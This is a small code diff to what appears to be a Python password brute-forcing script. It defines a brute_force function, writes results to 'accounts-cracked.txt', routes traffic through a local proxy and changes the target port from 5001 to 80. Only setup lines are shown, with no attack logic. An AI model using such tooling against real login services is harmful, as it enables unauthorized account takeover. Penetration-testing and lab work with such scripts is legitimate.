@@ -6,6 +6,7 @@ import time
 outFile = open('accounts-cracked.txt', 'w')
 def brute_force(user, password):
     domain = "appserver.me:5001"
+    domain = "appserver.me:80"
     name = user.strip()
     passwd = password.strip()
     proxy = {"http":"127.0.0.1:8080"}
